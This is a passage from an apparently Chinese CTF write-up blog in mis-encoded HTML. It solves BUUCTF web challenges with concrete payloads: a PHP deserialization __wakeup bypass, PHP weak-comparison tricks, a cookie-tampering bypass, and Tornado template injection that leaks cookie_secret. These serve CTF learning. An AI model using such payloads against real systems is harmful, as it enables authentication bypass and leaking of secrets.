punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—å‡ºurlä¼ å‚å€¼éœ€è¦ï¼š</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;100,username&#x3D;admin&#96;æ‰èƒ½&#96;echo $flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span>admin<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>admin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A100<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>éœ€è¦å¯¹<code>function __wakeup()&#123;        $this-&gt;username = &#39;guest&#39;;    &#125;</code>è¿›è¡Œç»•è¿‡ï¼Œå¯æ›´æ”¹å±æ€§æ•°é‡ç»•è¿‡ï¼ˆç³»åˆ—åŒ–æ¼æ´ï¼‰</p><p><u><em>è°ƒç”¨unserialize()æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨é­”æ³•å‡½æ•°wakeup(),å¯ä»¥é€šè¿‡æ”¹å˜å±æ€§æ•°ç»•è¿‡ï¼ŒæŠŠ<code>Name</code>åé¢çš„2æ”¹ä¸º3æˆ–ä»¥ä¸Šå³å¯</em></u></p><h3 id="æœ€ç»ˆpayload1-phpä¸­çš„urlencodeå‡½æ•°-ï¼š"><a href="#æœ€ç»ˆpayload1-phpä¸­çš„urlencodeå‡½æ•°-ï¼š" class="headerlink" title="æœ€ç»ˆpayload1(phpä¸­çš„urlencodeå‡½æ•°)ï¼š"></a>æœ€ç»ˆpayload1(phpä¸­çš„urlencodeå‡½æ•°)ï¼š</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>admin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A100<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>ç„¶åurlè¯†åˆ«ä¸äº†<code>&quot;</code>ï¼Œæ”¹ä¸º<code>%22</code></li><li>å› ä¸ºæˆå‘˜ï¼ˆå±æ€§ï¼‰æ˜¯privateï¼Œæ‰€ä»¥è¦åœ¨ç±»åå’Œæˆå‘˜åå‰åŠ <code>%00</code>è¿™ä¸ªurlç¼–ç æ˜¯ç©ºçš„æ„æ€ã€‚å› ä¸ºç”Ÿäº§åºåˆ—åŒ–æ—¶ä¸ä¼šæŠŠè¿™ä¸ª<code>ç©º</code>ä¹Ÿè¾“å‡ºã€‚</li><li>ä¹Ÿå¯ä»¥ç›´æ¥ç”¨åºåˆ—åŒ–åçš„urlç¼–ç ã€‚è¿™é‡Œè¦æ³¨æ„ï¼Œphpçš„<code>urlencode()</code>æ˜¯ä¼šè‡ªåŠ¨æŠŠ<code>ç©º</code>ç¼–ç æˆ%00</li></ol><h3 id="æœ€ç»ˆpayload2-æ‰‹åŠ¨å°†-â€-å’Œ-ç©ºæ ¼-ç”¨-22-ä¸-00-æ›¿æ¢-ï¼š"><a href="#æœ€ç»ˆpayload2-æ‰‹åŠ¨å°†-â€-å’Œ-ç©ºæ ¼-ç”¨-22-ä¸-00-æ›¿æ¢-ï¼š" class="headerlink" title="æœ€ç»ˆpayload2(æ‰‹åŠ¨å°†==â€==å’Œ ==ç©ºæ ¼==ç”¨==%22==ä¸==%00==æ›¿æ¢)ï¼š"></a>æœ€ç»ˆpayload2(æ‰‹åŠ¨å°†==â€==å’Œ ==ç©ºæ ¼==ç”¨==%22==ä¸==%00==æ›¿æ¢)ï¼š</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span>Name<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span>admin<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206152322629.png" alt="image-20220615232229502"></p><p>é­”æ³•å‡½æ•°<br>é€šå¸¸æ¥è¯´æœ‰ä¸€äº›PHPçš„é­”æ³•å‡½æ•°ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ï¼Œå¦‚ï¼š<br>__construct å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨<br>__destruct å½“å¯¹è±¡è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ (phpç»å¤§å¤šæ•°æƒ…å†µä¸‹ä¼šè‡ªåŠ¨è°ƒç”¨é”€æ¯å¯¹è±¡)<br>__sleep() ä½¿**ç”¨serialize()å‡½æ•°æ—¶è§¦å‘<br>__wakeup ä½¿ç”¨unserialse()**å‡½æ•°æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨<br>__toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚<br>__call() åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘<br>__callStatic() åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘<br>__get() ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®//è°ƒç”¨ç§æœ‰å±æ€§æ—¶ä½¿ç”¨<br>__set() ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§<br>__isset() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘<br>__unset() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘<br>__toString() æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘,è¿”å›å€¼éœ€è¦ä¸ºå­—ç¬¦ä¸²<br>__invoke() å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦`å‘</p><p><a href="%5B(6%E6%9D%A1%E6%B6%88%E6%81%AF">å‚è€ƒé“¾æ¥</a> BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112591542?ops_request_misc=%7B%22request_id%22:%22165520374516782184647117%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165520374516782184647117&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-112591542-null-null.142%5Ev14%5Epc_search_result_control_group,157%5Ev14%5Enew_3&utm_term=%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98+2019%5DPHP+1&spm=1018.2226.3001.4187">æå®¢å¤§æŒ‘æˆ˜ 2019]PHP 1_wowå°åçš„åšå®¢-CSDNåšå®¢</a>)</p><h1 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h1><p>é¢˜ç›®æè¿°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206161557164.png" alt="image-20220616155752118"></p><p>æºç æ²¡æ¶ˆæ¯ï¼Œå°è¯•dirsearchæ‰«ç›®å½•ï¼Œæ— çº¿ç´¢</p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts/tree/master/ctfDict">æ¢ctfç›¸å…³å¤‡ä»½å­—å…¸ï¼š</a></p><p>æ‰«çš„è¿‡ç¨‹ä¸­<img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206161647834.png" alt="image-20220616164707784"></p><p>éƒ½æ˜¯429ï¼ˆå¹¶å‘è¯·æ±‚è¿‡å¤šï¼‰</p><p>ç­‰ä¼šå†æ‰«</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try to find out source file!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phpå¼±ç±»å‹æ¯”è¾ƒï¼ˆ==ï¼‰ï¼Œå½“æ•°å­—å’Œå­—ç¬¦/å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæ—¶ä¼šå°†å­—ç¬¦/å­—ç¬¦ä¸²å…ˆè½¬åŒ–ä¸ºæ•°å­—ï¼ˆå³æ•°å­—å­—ç¬¦è½¬ä¸ºåŸå€¼ï¼Œè€Œå­—ç¬¦ä¼šè½¬ä¸º0ï¼‰</p><h3 id="å¾—payloadï¼š"><a href="#å¾—payloadï¼š" class="headerlink" title="å¾—payloadï¼š"></a>å¾—payloadï¼š</h3><p><code>?key=123</code></p><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h1><h3 id="é¢˜ç›®æè¿°ï¼š-1"><a href="#é¢˜ç›®æè¿°ï¼š-1" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206241825566.png" alt="image-20220624182551491"></p><h3 id="æŸ¥çœ‹FLAGé¡µé¢ä¸­çš„å†…å®¹"><a href="#æŸ¥çœ‹FLAGé¡µé¢ä¸­çš„å†…å®¹" class="headerlink" title="æŸ¥çœ‹FLAGé¡µé¢ä¸­çš„å†…å®¹"></a>æŸ¥çœ‹FLAGé¡µé¢ä¸­çš„å†…å®¹</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206241826238.png" alt="image-20220624182642209"></p><blockquote><p>If you want to buy the FLAG:<br>You must be a student from CUIT!!!<br>You must be answer the correct password!!!</p></blockquote><blockquote><p>Only Cuitâ€™s students can buy the FLAG</p></blockquote><p><strong>æç¤ºéœ€è¦ä»¥Cuitï¼ˆChengdu University of Information Technologyï¼‰å­¦ç”Ÿçš„èº«ä»½ç™»å½•è€Œä¸”è¦è¾“å…¥æ­£ç¡®çš„å¯†ç </strong></p><h3 id="pay-phpä¸­å…³é”®éƒ¨åˆ†"><a href="#pay-phpä¸­å…³é”®éƒ¨åˆ†" class="headerlink" title="pay.phpä¸­å…³é”®éƒ¨åˆ†"></a>pay.phpä¸­å…³é”®éƒ¨åˆ†</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span>post money <span class="token keyword">and</span> password<span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"password can't be number&lt;/br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Password Right!&lt;/br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>isset()å‡½æ•°æ˜¯ç”¨æ¥æ£€éªŒå˜é‡æ˜¯å¦è¢«è®¾ç½®çš„ã€‚<br>is_numeric()å‡½æ•°æ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦åªç”±æ•°å­—ç»„æˆï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸­åªåŒ…æ‹¬æ•°å­—ï¼Œå°±è¿”å›Tureï¼Œå¦åˆ™è¿”å›Falseã€‚</p><p>å¯¹äº$password == 404ï¼Œåœ¨PHPä¸­==æ˜¯ä¸€ç§å¼±ç±»å‹æ¯”è¾ƒï¼Œå³åªå–å­—ç¬¦ä¸²ä¸­å¼€å¤´çš„æ•´æ•°éƒ¨åˆ†è¿›è¡Œæ¯”è¾ƒã€‚</p><p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥å¾—å‡ºç»•è¿‡å¯†ç çš„æ–¹æ³•ï¼š<br>â€ƒâ€ƒç”¨POSTæ–¹æ³•å‘é€ä¸€ä¸ªåä¸ºpasswordçš„å˜é‡ï¼Œä»¤password = 404a(åœ¨404åé¢æ·»åŠ ä»»æ„å­—æ¯å³å¯)æˆ–password = 404%20(ç›¸å½“äºåœ¨404åé¢åŠ äº†ä¸€ä¸ªç©ºæ ¼ï¼Œå…¶ä»–ç©ºç™½å­—ç¬¦ä¹Ÿå¯ä»¥ç»•è¿‡)</p><p>æ³¨æ„åˆ°æºä»£ç ä¸­è¿˜æœ‰è¿™æ ·ä¸€å¥ï¼šFlag need your 100000000 money<br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¿˜éœ€è¦ç”¨POSTæ–¹æ³•ä¸Šä¼ moneyå˜é‡ä½¿å…¶ç­‰äº100000000</p><h3 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206241830063.png" alt="image-20220624183051037"></p><p>åœ¨Requestè¯·æ±‚ä¸­ï¼Œ<code>Cookie: user=0</code>ï¼Œè¿™é‡Œæ˜¯èº«ä»½åˆ¤æ–­çš„ä½ç½®ï¼Œåœ¨å¸ƒå°”å€¼ä¸­0ä¸ºfalseï¼Œ1ä¸ºtrueï¼Œæˆ‘ä»¬å°†å…¶æ”¹ä¸º<code>Cookie: user=1</code>ä»¥é€šè¿‡èº«ä»½éªŒè¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206241832481.png" alt="image-20220624183246456"></p><blockquote><p>æ˜¾ç¤º<code>Nember lenth is too long</code>åº”è¯¥æ˜¯å­˜åœ¨é•¿åº¦é™åˆ¶ï¼Œè¿™é‡Œæœ‰ä¸¤ç§ç»•è¿‡æ–¹æ³•<br>1ã€ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡<code>money=1e9</code><br>2ã€æ•°ç»„ç»•è¿‡<code>money[]=1</code></p><blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206241829282.png" alt="image-20220624182938253"></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206241831950.png" alt="image-20220624183133926"></p></blockquote></blockquote><h1 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h1><h2 id="SSTI-ä»‹ç»"><a href="#SSTI-ä»‹ç»" class="headerlink" title="SSTI ä»‹ç»"></a>SSTI ä»‹ç»</h2><p>å°±æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆServer-Side Template Injectionï¼‰</p><p>æ¼æ´æˆå› å°±æ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShell ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§ã€‚</p><h2 id="tornado-render"><a href="#tornado-render" class="headerlink" title="tornado render"></a>tornado render</h2><p>tornado renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡<code>&#123;&#123;&#125;&#125;</code>è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚</p><h2 id="é¢˜ç›®æè¿°ï¼š-2"><a href="#é¢˜ç›®æè¿°ï¼š-2" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252206755.png" alt="image-20220625220604668"></p><blockquote><p>flag.txtï¼š</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252208166.png" alt="image-20220625220813133"></p><blockquote><p>welcome.txt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252209874.png" alt="image-20220625220953841"></p><blockquote><p>hints.txt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252210536.png"></p><p>é¢˜ç›®é“¾æ¥ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//e1b975d1-eca8-4604-b1a1-efe8bf0b1f35.node4.buuoj.cn:81/file?filename=/welcome.txt&amp;filehash=7e73b8eecefb8cb8424ae331e3c4ac14</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252219622.png" alt="image-20220625221925582"></p><p>çŒœæµ‹ï¼Ÿmsgå³ä¸ºæ³¨å…¥ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252220003.png" alt="image-20220625222033970"></p><p>å¯è§é¡µé¢è¿”å›çš„ç”±msgçš„å€¼å†³å®š,ä¿®æ”¹msgçš„å€¼å½¢æˆæ³¨å…¥,è·å¾—ç¯å¢ƒå˜é‡</p><blockquote><p>æ¨æµ‹md5åŠ å¯†è¿‡åçš„å€¼å°±æ˜¯urlä¸­filehashå¯¹åº”çš„å€¼ï¼Œæƒ³è·å¾—flagåªè¦æˆ‘ä»¬åœ¨filenameä¸­ä¼ å…¥/fllllllllllllagæ–‡ä»¶å’Œfilehashï¼Œæ‰€ä»¥å…³é”®æ˜¯è·å–cookie_secret</p></blockquote><blockquote><blockquote><p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡ï¼Œæ¯”å¦‚ <code>&#123;&#123;escape(handler.settings["cookie"])&#125;&#125;</code>ï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯<code>handler.settings</code>å¯¹è±¡ï¼Œé‡Œé¢å­˜å‚¨ç€ä¸€äº›ç¯å¢ƒå˜é‡</p></blockquote></blockquote><ol><li>handler æŒ‡å‘RequestHandler</li><li>è€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settings</li><li>æ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼</li><li>å¤§æ¦‚å°±æ˜¯è¯´ï¼Œè¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬ä¸€ä¸‹ç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬æ­£æ˜¯ä»è¿™é‡Œè·å–çš„cookie_secret</li></ol><h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1:"></a>payload1:</h2><pre class="line-numbers language-none"><code class="language-none">?msg&#x3D;&#123;&#123;handler.settings&#125;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252226715.png" alt="image-20220625222610664"></p><p>Pythonè„šæœ¬è·å–filename+cookie_secretçš„MD5åŠ å¯†å€¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> 